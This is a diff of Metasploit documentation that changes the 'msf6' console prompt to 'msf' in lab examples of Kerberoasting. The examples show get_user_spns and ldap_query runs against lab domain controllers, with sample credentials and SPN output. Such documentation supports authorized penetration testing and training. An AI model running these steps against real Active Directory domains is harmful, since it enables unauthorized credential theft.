@@ -51,7 +51,7 @@ run rhost=192.168.123.13 user=<username> pass=<password> domain=<domain>
 If you followed the lab setup setup above, this should output the following result:
 
 ```msf
-msf6 auxiliary(gather/get_user_spns) > run rhost=192.168.123.13 user=Administrator pass=p4$$w0rd domain=adf3.local
+msf auxiliary(gather/get_user_spns) > run rhost=192.168.123.13 user=Administrator pass=p4$$w0rd domain=adf3.local
 
 [*] Running for 192.168.123.13...
 [+] ServicePrincipalName                    Name                MemberOf  PasswordLastSet             LastLogon  Delegation
@@ -109,16 +109,16 @@ First an SPN needs to be found. This can be done in a number of ways - including
 very own `auxiliary/gather/ldap_query` module:
 
 ```msf
-msf6 > use auxiliary/gather/ldap_query
-msf6 auxiliary(gather/ldap_query) > set RHOSTS 172.16.199.235
+msf > use auxiliary/gather/ldap_query
+msf auxiliary(gather/ldap_query) > set RHOSTS 172.16.199.235
 RHOSTS => 172.16.199.235
-msf6 auxiliary(gather/ldap_query) > set BIND_DN DARWIN_CLAY
+msf auxiliary(gather/ldap_query) > set BIND_DN DARWIN_CLAY
 BIND_DN => DARWIN_CLAY
-msf6 auxiliary(gather/ldap_query) > set BIND_PW N0tpassword!
+msf auxiliary(gather/ldap_query) > set BIND_PW N0tpassword!
 BIND_PW => N0tpassword!
-msf6 auxiliary(gather/ldap_query) > set action ENUM_USER_SPNS_KERBEROAST
+msf auxiliary(gather/ldap_query) > set action ENUM_USER_SPNS_KERBEROAST
 action => ENUM_USER_SPNS_KERBEROAST
-msf6 auxiliary(gather/ldap_query) > run
+msf auxiliary(gather/ldap_query) > run
 [*] Running module against 172.16.199.235
 
 [+] Successfully bound to the LDAP server!
